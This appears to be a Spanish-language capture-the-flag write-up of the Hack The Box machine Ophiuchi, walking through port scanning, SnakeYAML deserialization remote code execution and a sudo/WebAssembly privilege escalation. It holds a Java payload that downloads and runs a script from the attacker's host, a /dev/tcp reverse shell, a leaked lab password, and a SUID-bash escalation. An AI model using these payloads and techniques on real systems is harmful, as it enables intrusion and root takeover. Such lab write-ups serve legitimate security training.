---
layout      : post
title       : "Maquina - Ophiuchu"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Ophiuchi/banner.png
category    : [ hackthebox ]
tags        : [ yaml parser, java deserealization, tomcat explotation ]
---

Hoy vamos a hacer una máquina `hackthebox` de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de `YAML` para `SnakeYAML` utilizada en aplicaciones java, y modificando un archivo `wasm` para obtener privilegios de `root`.


Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Ophiuchi
❯ ls
 Ophiuchi
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.227
PING 10.10.10.227 (10.10.10.227) 56(84) bytes of data.
64 bytes from 10.10.10.227: icmp_seq=1 ttl=63 time=124 ms

--- 10.10.10.227 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.383/124.383/124.383/0.000 ms
```
Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.227 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:16 GMT
Initiating SYN Stealth Scan at 21:16
Scanning 10.10.10.227 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.227
Discovered open port 22/tcp on 10.10.10.227
Completed SYN Stealth Scan at 21:17, 18.29s elapsed (65535 total ports)
Nmap scan report for 10.10.10.227
Host is up, received user-set (0.15s latency).
Scanned at 2023-03-24 21:16:59 GMT for 18s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
           Raw packets sent: 90294 (3.973MB) | Rcvd: 90276 (3.611MB)
```
Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,8080 10.10.10.227 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:21 GMT
Nmap scan report for 10.10.10.227
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 8080   | HTTP     | Apache Tomcat 9.0.38 |


## Website - TCP 8080

Vamos a usar la herramienta `whatweb` para ver por consola el gestor de contenido de la pagina web.

```python
❯ whatweb http://10.10.10.227:8080
http://10.10.10.227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.10.10.227], Java, Title[Parse YAML]
```

El comando nos reporta algo interesante `Parse YAML`

Vamos a abrir la web y vemos que la pagina efectivamente es un `Yaml Parser`

![](/assets/images/HTB/htb-writeup-Ophiuchi/web2.png)

Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a `Yaml Parser`

Encontramos un exploit publico en un repositorio de `github`: 

* [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload).

El exploit nos habla sobre deserializacion, pero que es deserializacion?

> Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible.

En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir `RCE` "ejecucion remota de comandos":

Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo `YAML`. 

> ¿Pero como lo validamos entonces?

Pues en el repositorio nos muestra un codigo en `yaml` que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina.

Para lo cual primero debemos montarnos un servidor web, usaremos `python`:

![](/assets/images/HTB/htb-writeup-Ophiuchi/web4.PNG)

Despues realizamos el parseo:

![](/assets/images/HTB/htb-writeup-Ophiuchi/web3.PNG)

y vemos como efectivamente recibimos una peticion.

![](/assets/images/HTB/htb-writeup-Ophiuchi/web5.PNG)


## Explotación [#](#explotación) {#explotación}

Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:

* [CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution](https://nvd.nist.gov/vuln/detail/CVE-2017-1000207).

Bueno entonces al pasarle nuestro payload `SNAKE YAML` llamara al constructor `ScriptEngineFactory` y este a su vez realizara una peticion a nuestra maquina.

Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:

* [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload).

Hacemos la clonacion del repositorio:

```bash
❯ git clone https://github.com/artsploit/yaml-payload
Clonando en 'yaml-payload'...
remote: Enumerating objects: 10, done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
Recibiendo objetos: 100% (10/10), listo.
❯ ls
 yaml-payload   2021-07-03-ophiuchi.md

```
El exploit nos dice que debemos poner el codigo que deseamos ejecutar en `AwesomeScriptEngineFactory.java`

```bash
❯ tree
.
├── 2021-07-03-ophiuchi.md
└── yaml-payload
    ├── README.md
    └── src
        ├── artsploit
        │   └── AwesomeScriptEngineFactory.java
        └── META-INF
            └── services
                └── javax.script.ScriptEngineFactory

5 directories, 4 files
```

Observamos que se encuentra ahi el script `AwesomeScriptEngineFactory.java` lo abrimos y procedemos a modificar el codigo que queremos ejecutar 

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.16.4/reverse.sh -o /tmp/reverse.sh");
            Runtime.getRuntime().exec("bash /tmp/reverse.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```

Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con `curl` nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio `tmp` de la maquina victima con el nombre `reverse.sh`.

Seguidamente procederemos a crear un script en bash con el nombre `reverse.sh` el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto `443` para obtener una shell reversa.

```bash
#!/bin/bash


bash -i >& /dev/tcp/10.10.16.4/443 0>&1

```

Procedemo a compilar `AwesomeScriptEngineFactory.java` y esto nos genera un archivo 

```bash
❯ javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
manifiesto agregado
ignorando entrada META-INF/
agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)
agregando: META-INF/services/javax.script.ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)
agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)
agregando: artsploit/AwesomeScriptEngineFactory.java(entrada = 1575) (salida = 420)(desinflado 73%)
agregando: artsploit/AwesomeScriptEngineFactory.class(entrada = 1678) (salida = 705)(desinflado 57%)

❯ ls
 src   README.md   yaml-payload.jar
```

modificamos el codigo `YAML` el cual insertaremos en la pagina `YAML Parser`, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo `yaml-payload-jar` y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo `reverse.sh`

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.4/yaml-payload.jar"]
  ]]
]
```
Montamos un servidor con `python` en donde tenemos los dos archivos:

```bash
❯ ls
 src   README.md   reverse.sh   yaml-payload.jar
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

y nos ponemos en escucha con `ncat` en el puerto `443`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```
Enviamos la peticion:

![](/assets/images/HTB/htb-writeup-Ophiuchi/web6.PNG)

y estamos dentro como el usuario `tomcat`:

![](/assets/images/HTB/htb-writeup-Ophiuchi/web7.PNG)

Como siempre vamos a realizar el tratamiento de la `tty` para obtener una full interactiva.

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.227.
Ncat: Connection from 10.10.10.227:56610.
bash: cannot set terminal process group (796): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tomcat@ophiuchi:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
tomcat@ophiuchi:/$ export TERM=xterm
tomcat@ophiuchi:/$ export SHELL=bash
tomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla "ejecuta stty size"
```
Nos dirigimos al directorio `home` y tratamos de leer la primera flag `user.txt` pero vemos que no tenemos acceso:

```bash
tomcat@ophiuchi:/$ cd /home
tomcat@ophiuchi:/home$ ls
admin
tomcat@ophiuchi:/home$ cd admin/
tomcat@ophiuchi:/home/admin$ ls
user.txt
tomcat@ophiuchi:/home/admin$ cat user.txt 
cat: user.txt: Permission denied
tomcat@ophiuchi:/home/admin$
```

Como vemos que somos `tomcat`, si recordamos su estructura sabemos que existe un archivo llamado `tomcat-users.xml`

```bash
tomcat@ophiuchi:/home/admin$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@ophiuchi:/home/admin$ find / -name tomcat-users.xml 2>/dev/null
/opt/tomcat/conf/tomcat-users.xml
tomcat@ophiuchi:/home/admin$
```

Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario `admin`


```bash
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
	version="1.0">
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```
Procedemos esa contraseña con el usuario `admin` y bingo!, somos el usuario 'admin' y ahora si podemos visualizar la primera flag `user.txt`.

```bash
tomcat@ophiuchi:/home/admin$ su admin
Password: 
admin@ophiuchi:~$ whoami
admin
admin@ophiuchi:~$ cat user.txt 
330298484fe5a40840ac52e730fb7f15
```
Ahora anteriormente vimos en la fase de reconocimiento que el puerto `22` estaba abierto, asi que por que no probemos a conectarnos por `ssh`:

```bash
sshpass -p 'whythereisalimit' ssh admin@10.10.10.227
❯ ssh admin@10.10.10.227
The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
admin@10.10.10.227's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
```
Ejecutamos el comando `id` para ver a que grupos pertenecemos y despues ejecutamos el comado `sudo -l`, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario `admin`.

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

```bash
admin@ophiuchi:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
admin@ophiuchi:~$ 
```

Podemos ejecutar un programa llamado `index.go` usando el binario `/usr/bin/go` como `root` vale?

Veremos como podemos aprovecharnos de esto para escalar privilegios.

Nos dirigimos a la ruta donde se encuentra el archivo index.go.

```bash
admin@ophiuchi:~$ cd /opt/wasm-functions/
admin@ophiuchi:/opt/wasm-functions$ ls
backup  deploy.sh  index  index.go  main.wasm
admin@ophiuchi:/opt/wasm-functions$ ls -la
total 3928
drwxr-xr-x 3 root root    4096 Oct 14  2020 .
drwxr-xr-x 5 root root    4096 Oct 14  2020 ..
drwxr-xr-x 2 root root    4096 Oct 14  2020 backup
-rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh
-rwxr-xr-x 1 root root 2516736 Oct 14  2020 index
-rw-rw-r-- 1 root root     522 Oct 14  2020 index.go
-rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm
admin@ophiuchi:/opt/wasm-functions$
```

Veamos el codigo del archivo `ìndex.go` el cual podemos ejecutar:

```go
package main

import (
	"fmt"
	wasm "github.com/wasmerio/wasmer-go/wasmer"
	"os/exec"
	"log"
)


func main() {
	bytes, _ := wasm.ReadBytes("main.wasm")

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports["info"]
	result,_ := init()
	f := result.String()
	if (f != "1") {
		fmt.Println("Not ready to deploy")
	} else {
		fmt.Println("Ready to deploy")
		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}
```
Al ejecutar el `index.go` vemos el mensaje `Not ready to deploy` el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo 'main.wasm'

```bash
admin@ophiuchi:/opt/wasm-functions$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
admin@ophiuchi:/opt/wasm-functions$
```

Volvemos a leer el script y vemos que hay una variable `f` que es diferente de `1`, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el `deploy.sh`, el cual podriamos tratar de manipular.

```go
package main

import (
	"fmt"
	wasm "github.com/wasmerio/wasmer-go/wasmer"
	"os/exec"
	"log"
)


func main() {
	bytes, _ := wasm.ReadBytes("main.wasm")

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports["info"]
	result,_ := init()
	f := result.String()
	if (f != "1") {
		fmt.Println("Not ready to deploy")
	} else {
		fmt.Println("Ready to deploy")
		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}
```

Podemos ver si tenemos permiso de modificar el archivo `deploy.sh`

```bash
admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
#!/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
admin@ophiuchi:/opt/wasm-functions$ ls -l deploy.sh 
-rw-r--r-- 1 root root 88 Oct 14  2020 deploy.sh
admin@ophiuchi:/opt/wasm-functions$
```
Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script `ìndex.go` nos ejecuta el `deploy.sh` de forma relativa, interesante; entonces yo podria crearme en el directorio `tmp` mi propio archivo `deploy.sh` y copiarme el `main.wasm` ya que me los va a pillar desde alli y se podria tensa la cosa.

```bash
admin@ophiuchi:/opt/wasm-functions$ cd /tmp
admin@ophiuchi:/tmp$ cp /opt/
tomcat/         wasm-functions/ wasmer-go/      
admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main.wasm .
admin@ophiuchi:/tmp$ touch deploy.sh
admin@ophiuchi:/tmp$
```
En `deploy.sh` lo que voy a intentar hacer es que este script me asigne una `suid` a la `bash`, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal.

```bash
#!/bin/bash

chmod 4755 /bin/bash
```
y si intentamos ejecutar nuevamente el `index.go` vemos que nuevamente nos sale.

```bash
admin@ophiuchi:/tmp$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

Entonces quiero pensar que en el archivo `main.wasm` del `index.go` debe existir una condicional que hace que la variable `f` no sea igual a `1` y por ese motivo no entra a la condicion que me ejecute el `deploy.sh`, pero si tratamos de leer el `main.wasm` no podriamos por que no es de un formato legible.

La idea seria convertir el archivo `main.wasm` a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:

 * [https://github.com/WebAssembly/wabt](https://github.com/WebAssembly/wabt)

Como la maquina tiene `python3` vamos a abrir un servidor web por el puerto `8000` para traernos el archivo `main.wasm`

```bash
admin@ophiuchi:/tmp$ which python3
/usr/bin/python3
admin@ophiuchi:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.16.4 - - [25/Mar/2023 01:21:42] "GET /main.wasm HTTP/1.1" 200 -
```

```bash
wget http://10.10.10.227:8000/main.wasm
--2023-03-25 01:21:43--  http://10.10.10.227:8000/main.wasm
Conectando con 10.10.10.227:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1479371 (1,4M) [application/wasm]
Grabando a: «main.wasm»

main.wasm              100%[=========================>]   1,41M   276KB/s    en 7,4s    

2023-03-25 01:21:51 (195 KB/s) - «main.wasm» guardado [1479371/1479371]

❯ ls
 yaml-payload   2021-07-03-ophiuchi.md   main.wasm
```

Ahora usando la herramienta previamente instalada haremos uso de `wasm2wat` sobre el archivo `main.wasm` y lo exportaremos como `main.wat`

```bash
❯ ls
 yaml-payload   2021-07-03-ophiuchi.md   main.wasm
❯ cat main.wat
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

Al leer el archivo vemos que hay una constante declarada con el valor de 0 `i32.const 0)` la cual genera el problema por el cual el `index.go` no nos puede ejecutar el `deploy.sh`, asi que la modificaremos esa variable y le pondremos el valor de `1`.

```bash
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))

```

Una vez modificada debemos volver a generar un archivo `main.wasm`, el cual lo haremos con `wat2wasm` y lo subimos a la maquina victima compartiendonos un servicio con `python`no sin antes borrar el `main.wasm` de antes.

```bash
❯ /opt/wabt/build/wat2wasm main.wat > main.wasm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
admin@ophiuchi:/tmp$ rm main.wasm 
admin@ophiuchi:/tmp$ wget http://10.10.16.4/main.wasm
--2023-03-25 01:34:51--  http://10.10.16.4/main.wasm
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112 [application/wasm]
Saving to: ‘main.wasm’

main.wasm             100%[=========================>]     112  --.-KB/s    in 0s

2023-03-25 01:34:52 (23.2 MB/s) - ‘main.wasm’ saved [112/112]

admin@ophiuchi:/tmp$ ls
deploy.sh
hsperfdata_tomcat
main.wasm
```

Teniendo los archivos volvemos a ejecutar el `index.go` con el privilegio asignado y

```bash
admin@ophiuchi:/tmp$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```
Nos lo ejecuta correctamente, entonces nos ejecuto el `deploy.sh` veamos si es cierto:

```bash
admin@ophiuchi:/tmp$ ls -ls /bin/bash
1156 -rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

y poom! ahora la bash es `suid` solo debemos ejecutar ahora el comando `bash -p` y visualizar la segunda flag `root.txt` y habriamos comprometido completamente el sistema :).

```bash
admin@ophiuchi:/tmp$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
0a7279e90650d908863ec8e8155efb52
bash-5.0#
```
